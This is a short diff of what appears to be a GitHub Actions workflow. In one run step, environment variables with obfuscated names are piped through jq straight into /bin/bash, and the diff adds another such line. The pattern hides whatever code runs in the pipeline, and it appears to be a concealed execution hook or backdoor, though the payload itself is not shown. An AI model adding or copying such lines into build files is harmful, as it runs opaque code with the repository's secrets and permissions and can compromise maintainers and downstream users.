@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$ondm93" | jq -r .pb74225 | /bin/bash
           echo $ezo987 | jq -r .zwq257 | /bin/bash
+          echo $l49 | jq -r .v784 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
